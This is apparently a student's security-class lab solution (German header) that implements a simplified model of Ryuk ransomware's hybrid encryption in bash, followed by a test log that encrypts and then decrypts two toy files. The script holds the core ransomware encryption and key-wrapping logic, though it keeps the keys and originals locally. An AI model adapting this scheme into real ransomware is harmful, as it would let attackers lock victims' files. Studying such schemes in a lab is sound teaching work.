Name

- Cedric Schmid

Klasse

- 5AHITS

Fach

- ITSE

Datum

- 11.10.2026

# Aufgabenstellung

https://www.franzmatejka.at/htl/doc/ITSI/lab/ransom_ryuk/01_ryuk.html

# Lösung

## `ryuk_ransom.sh`

```bash
#!/bin/bash
set -xeou pipefail

ACTION="encrypt"
# ACTION="decrypt"

generate_rsa_keys() {
  [[ -f rsa_generated ]] && return 0
  
  openssl genrsa -out rsa_global_key_private.key 2048
  openssl rsa -pubout -in rsa_global_key_private.key -out rsa_global_key_public.key

  openssl genrsa -out rsa_victim_key_private.key 2048
  openssl rsa -pubout -in rsa_victim_key_private.key -out rsa_victim_key_public.key

  aes_victim_key="$(head --bytes=32 /dev/urandom | xxd -p -c 0)"

  openssl aes-256-cbc -in rsa_victim_key_private.key -out victim_private.enc -K "$aes_victim_key" -iv "$iv"
  echo "$aes_victim_key" | openssl pkeyutl -encrypt -pubin -inkey rsa_global_key_public.key -out victim_key.enc

  mv rsa_victim_key_private.key rsa_victim_key_private.key.DELETED
  mv rsa_global_key_private.key rsa_global_key_private.key.DELETED

  touch rsa_generated
}

encrypt_file() {
  file="$1"
  aes_file_key="$(head --bytes=32 /dev/urandom | xxd -p -c 0)"

  openssl aes-256-cbc -in "$file" -out "$file.enc" -K "$aes_file_key" -iv "$iv"
  echo "$aes_file_key" | openssl pkeyutl -encrypt -pubin -inkey rsa_victim_key_public.key -out "$file.key"

  mv "$file" "$file.DELETED"
}

decrypt_file() {
  file="$1"

  aes_victim_key=$(openssl pkeyutl -decrypt -inkey rsa_global_key_private.key.DELETED -in victim_key.enc)
  openssl aes-256-cbc -d -in victim_private.enc -out rsa_victim_key_private.key -K "$aes_victim_key" -iv "$iv"

  aes_file_key=$(openssl pkeyutl -decrypt -inkey rsa_victim_key_private.key -in "$file.key")
  openssl aes-256-cbc -d -in "$file.enc" -out "${file%.DELETED}" -K "$aes_file_key" -iv "$iv"
}

iv="00000000000000000000000000000000"
generate_rsa_keys

for file in "$@"
do
  [[ "$ACTION" == "encrypt" ]] && encrypt_file "$file"
  [[ "$ACTION" == "decrypt" ]] && decrypt_file "$file"
done
```

## Test

```bash
bash-3.2$ ls
ryuk_ransom.sh
bash-3.2$ echo t > test.txt
bash-3.2$ echo h > hello
bash-3.2$ ls
hello		ryuk_ransom.sh	test.txt
bash-3.2$ ./ryuk_ransom.sh hello test.txt
+ ACTION=encrypt
+ iv=00000000000000000000000000000000
+ generate_rsa_keys
+ [[ -f rsa_generated ]]
+ openssl genrsa -out rsa_global_key_private.key 2048
+ openssl rsa -pubout -in rsa_global_key_private.key -out rsa_global_key_public.key
writing RSA key
+ openssl genrsa -out rsa_victim_key_private.key 2048
+ openssl rsa -pubout -in rsa_victim_key_private.key -out rsa_victim_key_public.key
writing RSA key
++ head --bytes=32 /dev/urandom
++ xxd -p -c 0
+ aes_victim_key=4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e
+ openssl aes-256-cbc -in rsa_victim_key_private.key -out victim_private.enc -K 4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e -iv 00000000000000000000000000000000
+ echo 4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e
+ openssl pkeyutl -encrypt -pubin -inkey rsa_global_key_public.key -out victim_key.enc
+ mv rsa_victim_key_private.key rsa_victim_key_private.key.DELETED
+ mv rsa_global_key_private.key rsa_global_key_private.key.DELETED
+ touch rsa_generated
+ for file in '"$@"'
+ [[ encrypt == \e\n\c\r\y\p\t ]]
+ encrypt_file hello
+ file=hello
++ head --bytes=32 /dev/urandom
++ xxd -p -c 0
+ aes_file_key=d13c0abc3050fece6b7a45e49b21f6f95566072689485436cf041218f34a1f04
+ openssl aes-256-cbc -in hello -out hello.enc -K d13c0abc3050fece6b7a45e49b21f6f95566072689485436cf041218f34a1f04 -iv 00000000000000000000000000000000
+ echo d13c0abc3050fece6b7a45e49b21f6f95566072689485436cf041218f34a1f04
+ openssl pkeyutl -encrypt -pubin -inkey rsa_victim_key_public.key -out hello.key
+ mv hello hello.DELETED
+ [[ encrypt == \d\e\c\r\y\p\t ]]
+ for file in '"$@"'
+ [[ encrypt == \e\n\c\r\y\p\t ]]
+ encrypt_file test.txt
+ file=test.txt
++ head --bytes=32 /dev/urandom
++ xxd -p -c 0
+ aes_file_key=eba41731a991b4e110bd526d48806a1f6452c25bbd4ef806a77a6ccbdb9e0c62
+ openssl aes-256-cbc -in test.txt -out test.txt.enc -K eba41731a991b4e110bd526d48806a1f6452c25bbd4ef806a77a6ccbdb9e0c62 -iv 00000000000000000000000000000000
+ echo eba41731a991b4e110bd526d48806a1f6452c25bbd4ef806a77a6ccbdb9e0c62
+ openssl pkeyutl -encrypt -pubin -inkey rsa_victim_key_public.key -out test.txt.key
+ mv test.txt test.txt.DELETED
+ [[ encrypt == \d\e\c\r\y\p\t ]]
bash-3.2$ vi ryuk_ransom.sh # change ACTION to decrypt
bash-3.2$ ./ryuk_ransom.sh hello test.txt
+ ACTION=decrypt
+ iv=00000000000000000000000000000000
+ generate_rsa_keys
+ [[ -f rsa_generated ]]
+ return 0
+ for file in '"$@"'
+ [[ decrypt == \e\n\c\r\y\p\t ]]
+ [[ decrypt == \d\e\c\r\y\p\t ]]
+ decrypt_file hello
+ file=hello
++ openssl pkeyutl -decrypt -inkey rsa_global_key_private.key.DELETED -in victim_key.enc
+ aes_victim_key=4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e
+ openssl aes-256-cbc -d -in victim_private.enc -out rsa_victim_key_private.key -K 4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e -iv 00000000000000000000000000000000
++ openssl pkeyutl -decrypt -inkey rsa_victim_key_private.key -in hello.key
+ aes_file_key=d13c0abc3050fece6b7a45e49b21f6f95566072689485436cf041218f34a1f04
+ openssl aes-256-cbc -d -in hello.enc -out hello -K d13c0abc3050fece6b7a45e49b21f6f95566072689485436cf041218f34a1f04 -iv 00000000000000000000000000000000
+ for file in '"$@"'
+ [[ decrypt == \e\n\c\r\y\p\t ]]
+ [[ decrypt == \d\e\c\r\y\p\t ]]
+ decrypt_file test.txt
+ file=test.txt
++ openssl pkeyutl -decrypt -inkey rsa_global_key_private.key.DELETED -in victim_key.enc
+ aes_victim_key=4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e
+ openssl aes-256-cbc -d -in victim_private.enc -out rsa_victim_key_private.key -K 4aceac41a39da410e8b30e68133e14c6fe5bf043c8d5d8118721c64587f17b1e -iv 00000000000000000000000000000000
++ openssl pkeyutl -decrypt -inkey rsa_victim_key_private.key -in test.txt.key
+ aes_file_key=eba41731a991b4e110bd526d48806a1f6452c25bbd4ef806a77a6ccbdb9e0c62
+ openssl aes-256-cbc -d -in test.txt.enc -out test.txt -K eba41731a991b4e110bd526d48806a1f6452c25bbd4ef806a77a6ccbdb9e0c62 -iv 00000000000000000000000000000000
bash-3.2$ cat hello test.txt
h
t
bash-3.2$ ls
hello					rsa_generated				rsa_victim_key_private.key.DELETED	test.txt.DELETED			victim_private.enc
hello.DELETED				rsa_global_key_private.key.DELETED	rsa_victim_key_public.key		test.txt.enc
hello.enc				rsa_global_key_public.key		ryuk_ransom.sh				test.txt.key
hello.key				rsa_victim_key_private.key		test.txt				victim_key.enc
bash-3.2$ 
```